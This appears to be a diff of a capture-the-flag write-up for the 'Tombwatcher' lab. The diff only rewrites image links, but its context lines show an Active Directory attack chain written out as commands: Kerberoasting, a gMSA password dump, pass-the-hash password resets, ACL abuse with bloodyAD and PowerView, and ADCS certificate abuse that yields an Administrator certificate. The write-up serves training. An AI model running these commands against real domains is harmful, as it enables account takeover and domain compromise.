@@ -124,7 +124,7 @@ INFO: Done in 00M 08S
 
 **Analyzing permissions in BloodHound:**
 
-![[Pasted image 20251011144858.png]]
+![Pasted image 20251011144858.png](/assets/images/2025-10-11-Tombwatcher/Pasted image 20251011144858.png)
 
 The graph reveals a clear privilege escalation path from our current user `henry` leading to `GenericAll` permissions on the `ADCS` organizational unit. Although currently empty, this presents an interesting escalation opportunity.
 
@@ -141,7 +141,7 @@ The graph reveals a clear privilege escalation path from our current user `henry
 
 **Exploiting WriteSPN on Alfred:**
 
-![[Pasted image 20251011105904.png]]
+![Pasted image 20251011105904.png](/assets/images/2025-10-11-Tombwatcher/Pasted image 20251011105904.png)
 
 Using `targetedKerberoast.py` to add an SPN and request a TGS:
 
@@ -185,7 +185,7 @@ Session completed
 
 **Adding Alfred to Infrastructure group:**
 
-![[Pasted image 20251011105938.png]]
+![Pasted image 20251011105938.png](/assets/images/2025-10-11-Tombwatcher/Pasted image 20251011105938.png)
 
 ```bash
 ❯ net rpc group addmem "Infrastructure" "alfred" -U tombwatcher.htb/henry%'H3nry_987TGV!' -S 10.129.138.227
@@ -200,7 +200,7 @@ Session completed
 
 **Dumping ansible_dev$ password:**
 
-![[Pasted image 20251011105836.png]]
+![Pasted image 20251011105836.png](/assets/images/2025-10-11-Tombwatcher/Pasted image 20251011105836.png)
 
 ```bash
 ❯ python3 gMSADumper.py -u alfred -p basketball -d tombwatcher.htb
@@ -221,7 +221,7 @@ ansible_dev$:aes128-cts-hmac-sha1-96:a1b2c3d4e5f6...
 
 **Resetting sam's password:**
 
-![[Pasted image 20251011112053.png]]
+![Pasted image 20251011112053.png](/assets/images/2025-10-11-Tombwatcher/Pasted image 20251011112053.png)
 
 ```bash
 ❯ impacket-changepasswd tombwatcher.htb/sam:@10.129.138.227 -newpass 'asdasd123' -hashes :e1e9fd9e46d0d747e1595167eedcec0f
@@ -239,7 +239,7 @@ Impacket v0.11.0 - Copyright 2023 Fortra
 
 **Setting ownership of john:**
 
-![[Pasted image 20251011112417.png]]
+![Pasted image 20251011112417.png](/assets/images/2025-10-11-Tombwatcher/Pasted image 20251011112417.png)
 
 ```bash
 ❯ python3 bloodyAD.py -u sam -p 'asdasd123' -d tombwatcher.htb --host 10.129.138.227 set owner john sam
@@ -249,7 +249,7 @@ Impacket v0.11.0 - Copyright 2023 Fortra
 
 **Granting full control:**
 
-![[Pasted image 20251011112604.png]]
+![Pasted image 20251011112604.png](/assets/images/2025-10-11-Tombwatcher/Pasted image 20251011112604.png)
 
 ```bash
 ❯ python3 bloodyAD.py -u sam -p 'asdasd123' -d tombwatcher.htb --host 10.129.138.227 add genericAll john sam
@@ -259,7 +259,7 @@ Impacket v0.11.0 - Copyright 2023 Fortra
 
 **Forcing password change:**
 
-![[Pasted image 20251011145937.png]]
+![Pasted image 20251011145937.png](/assets/images/2025-10-11-Tombwatcher/Pasted image 20251011145937.png)
 
 ```bash
 ❯ net rpc password "john" "asdasd123" -U "tombwatcher.htb"/"sam"%"asdasd123" -S "10.129.138.227"
@@ -271,11 +271,11 @@ Impacket v0.11.0 - Copyright 2023 Fortra
 
 Now that we control john, we can grant full control over any objects created in the currently-empty ADCS organizational unit:
 
-![[Pasted image 20251011151525.png]]
+![Pasted image 20251011151525.png](/assets/images/2025-10-11-Tombwatcher/Pasted image 20251011151525.png)
 
 **Granting john FullControl on ADCS OU using PowerView:**
 
-![[Pasted image 20251011151658.png]]
+![Pasted image 20251011151658.png](/assets/images/2025-10-11-Tombwatcher/Pasted image 20251011151658.png)
 
 ```powershell
 Add-DomainObjectAcl -TargetSearchBase "OU=ADCS,DC=tombwatcher,DC=htb" -PrincipalIdentity john -Rights All -Verbose
@@ -308,13 +308,13 @@ Certipy v4.8.0 - by Oliver Lyak (ly4k)
 
 **Noticing suspicious user SID:**
 
-![[Pasted image 20251011151920.png]]
+![Pasted image 20251011151920.png](/assets/images/2025-10-11-Tombwatcher/Pasted image 20251011151920.png)
 
 One user appears as a SID instead of a username, suggesting a deleted account.
 
 **RID brute-forcing:**
 
-![[Pasted image 20251011152019.png]]
+![Pasted image 20251011152019.png](/assets/images/2025-10-11-Tombwatcher/Pasted image 20251011152019.png)
 
 ```bash
 ❯ nxc smb 10.129.138.227 -u john -p 'asdasd123' --rid-brute
@@ -333,7 +333,7 @@ The gap at RID 1111 suggests deleted accounts that may be interesting.
 
 **Finding deleted user objects:**
 
-![[Pasted image 20251011152205.png]]
+![Pasted image 20251011152205.png](/assets/images/2025-10-11-Tombwatcher/Pasted image 20251011152205.png)
 
 ```powershell
 Get-ADObject -Filter 'isDeleted -eq $true -and ObjectClass -eq "user"' -IncludeDeletedObjects | ft Name, DistinguishedName
@@ -363,7 +363,7 @@ Three deleted `cert_admin` accounts found!
 
 **Commands for first account (cert_admin → cert_admin_1):**
 
-![[Pasted image 20251011152932.png]]
+![Pasted image 20251011152932.png](/assets/images/2025-10-11-Tombwatcher/Pasted image 20251011152932.png)
 
 ```bash
 # Restore the deleted user
@@ -391,7 +391,7 @@ The account with RID 1111 turns out to be the target account with interesting pr
 
 **Running Certipy as the restored cert_admin account (RID 1111):**
 
-![[Pasted image 20251011153241.png]]
+![Pasted image 20251011153241.png](/assets/images/2025-10-11-Tombwatcher/Pasted image 20251011153241.png)
 
 ```bash
 ❯ certipy find -u cert_admin@tombwatcher.htb -p 'asdasd123' -dc-ip 10.129.138.227 -vulnerable
@@ -409,7 +409,7 @@ Certipy v4.8.0 - by Oliver Lyak (ly4k)
     - Enrollment Rights: TOMBWATCHER.HTB\Domain Users
 ```
 
-![[Pasted image 20251011153310.png]]
+![Pasted image 20251011153310.png](/assets/images/2025-10-11-Tombwatcher/Pasted image 20251011153310.png)
 
 ### CVE-2024-49019 Exploitation
 
@@ -422,7 +422,7 @@ Certipy v4.8.0 - by Oliver Lyak (ly4k)
 
 **Step 1: Request enrollment agent certificate:**
 
-![[Pasted image 20251011153954.png]]
+![Pasted image 20251011153954.png](/assets/images/2025-10-11-Tombwatcher/Pasted image 20251011153954.png)
 
 ```bash
 ❯ certipy req -u cert_admin@tombwatcher.htb -p 'asdasd123' -ca TOMBWATCHER-CA -target 10.129.138.227 -template TombwatcherEnrollmentAgent
@@ -441,7 +441,7 @@ The generated certificate includes the "Certificate Request Agent" Application P
 
 **Step 2: Request certificate on behalf of Administrator:**
 
-![[Pasted image 20251011153919.png]]
+![Pasted image 20251011153919.png](/assets/images/2025-10-11-Tombwatcher/Pasted image 20251011153919.png)
 
 ```bash
 ❯ certipy req -u cert_admin@tombwatcher.htb -p 'asdasd123' -ca TOMBWATCHER-CA -target 10.129.138.227 -template User -on-behalf-of 'tombwatcher\administrator' -pfx cert_admin.pfx
@@ -458,7 +458,7 @@ Certipy v4.8.0 - by Oliver Lyak (ly4k)
 
 **Step 3: Authenticate and retrieve Administrator hash:**
 
-![[Pasted image 20251011154402.png]]
+![Pasted image 20251011154402.png](/assets/images/2025-10-11-Tombwatcher/Pasted image 20251011154402.png)
 
 ```bash
 ❯ certipy auth -pfx administrator.pfx -dc-ip 10.129.138.227
